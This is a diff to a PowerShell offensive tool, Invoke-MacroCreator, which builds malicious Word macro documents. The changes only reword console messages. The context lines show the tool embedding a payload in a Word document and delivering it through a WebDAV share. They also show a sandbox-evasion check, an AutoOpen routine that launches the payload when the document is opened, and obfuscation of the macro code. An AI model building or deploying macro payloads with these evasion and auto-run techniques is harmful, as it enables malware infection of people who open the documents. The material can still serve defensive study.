@@ -176,7 +176,7 @@ function Invoke-MacroCreator {
 			$payloadUNC = "\\" + $DEFAULT_WEBDAVDELIVERY + "\" + $fileName + "\"
 			Write-Host -ForegroundColor Blue "[*] No WebDavDelivery UNC specified. Using the default one [$payloadUNC]"
 		}
-		Write-Host -ForegroundColor Blue "[INFO] You must make the file [$fileName] downloadable using the WebDavDelivery Tool (https://github.com/Arno0x/WebDavDelivery)"
+		Write-Host -ForegroundColor Blue "[*] You must make the file [$fileName] downloadable using the WebDavDelivery Tool (https://github.com/Arno0x/WebDavDelivery)"
 	}
 	
 	if ($delivery -eq 'biblio' -Or $delivery -eq 'html') {
@@ -199,12 +199,12 @@ function Invoke-MacroCreator {
 			# Prepare the final command for VBA: escape double-quote
 			$finalCommand = $command.Replace('"','""')
 			if ($finalCommand.length -gt 253 -And $method -eq 3) {
-				Write-Host -ForegroundColor Red "[ERROR] Command execution method '3' does not support more that 253 characters. Choose another method (1 or 2)"
+				Write-Host -ForegroundColor Red "[!] Command execution method '3' does not support more that 253 characters. Choose another method (1 or 2)"
 				return -1 | Out-Null
 			}
 		}
 		else {
-			Write-Host -ForegroundColor Red "[ERROR] You must specify the final command line to use to execute your file payload. Use the '-c' switch"
+			Write-Host -ForegroundColor Red "[!] You must specify the final command line to use to execute your file payload. Use the '-c' switch"
 			return -1 | Out-Null
 		} 
 	}
@@ -212,7 +212,7 @@ function Invoke-MacroCreator {
 	if ($type -eq 'cmd' -And $method -eq 3) {
 		# Measure the command line size
 		if ((Get-Content $inputFile | Measure-Object -word -line -character) -gt 253) {
-			Write-Host -ForegroundColor Red "[ERROR] Command execution method '3' does not support more that 253 characters. Choose another method (1 or 2)"
+			Write-Host -ForegroundColor Red "[!] Command execution method '3' does not support more that 253 characters. Choose another method (1 or 2)"
 			return -1 | Out-Null
 		}
 	}
@@ -268,6 +268,7 @@ function Invoke-MacroCreator {
 				$i += 8000
 			}
 		}
+		Write-Host -ForegroundColor Green "[+] Payload embedded into the body of the word document"
 	}
 	
 	#-----------------------------------------------------------------------------------------
@@ -299,6 +300,7 @@ function Invoke-MacroCreator {
 		$mainCode += "`tIf #IsRunningInSandbox#() Then`n"
 		$mainCode += "`t`tExit Sub`n"
 		$mainCode += "`tEnd If`n"
+		Write-Host -ForegroundColor Green "[+] Added sandox evasion block code"
 	}
 	
 	#---- BLOCK 2: If obfuscation has been required, include the corresponding module
@@ -395,6 +397,7 @@ function Invoke-MacroCreator {
 		$mainCode += "Sub AutoOpen()`n"
 		$mainCode += "`t#Launch#`n"
 		$mainCode += "End Sub`n"
+		Write-Host -ForegroundColor Green "[+] Added auto open functions block code"
 	}
 	
 	#---- Concatenate the headers block, functions definition block and the main block
@@ -522,6 +525,10 @@ function NormalizeCode() {
 		[parameter(Mandatory=$true)]
 		[int]$key = 0
 	)
+
+	if ($obfuscate) {
+		Write-Host -ForegroundColor Green "[+] Obfuscating macro code"
+	}
 
 	#---- Get the list of all variables
 	$varList = [regex]::matches($code, '_[a-zA-Z]+?_') | % Value | Select-Object -Unique
